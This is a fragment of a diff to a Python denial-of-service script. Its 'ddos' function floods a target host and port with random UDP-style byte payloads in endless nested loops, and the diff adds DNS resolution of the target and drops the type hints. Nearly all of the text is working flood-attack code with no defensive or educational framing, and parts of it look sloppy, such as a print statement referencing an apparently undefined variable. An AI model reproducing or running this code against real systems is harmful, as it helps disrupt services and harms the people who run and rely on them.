@@ -37,7 +37,6 @@ bytes1 = random.randbytes(2000)
 bytes2 = random.randbytes(2900)
 system = platform.uname().system
 
-
 # this is better system = getattr(platform.uname(), "system")
 # instead of hardcoding a specific index
 # because if something in the l
@@ -55,17 +54,18 @@ def check_os():
 
 # Why use a try
 
-def ddos(target: str, port: str, ip: bool = False):
+def ddos(target, port, ip: bool = False):
     sent = 0
-    net = socket.getaddrinfo(target, port)
     try:
         while True:
-            sock.sendto(bytes1, (target, port))
+            net = socket.gethostbyname(target)
+            sock.sendto(bytes1, (net, port))
             sent = sent + 1
 
             print("Sending %s packets to %s through port:%s" % (sent, ipaddress, port))
             while True:
-                sock.sendto(bytes2, (target, port))
+                net2 = socket.gethostbyname(target)
+                sock.sendto(bytes2, (net2, port))
                 sent = sent + 1
                 print("Sending %s packets to %s through port:%s" % (sent, ipaddress, port))
 
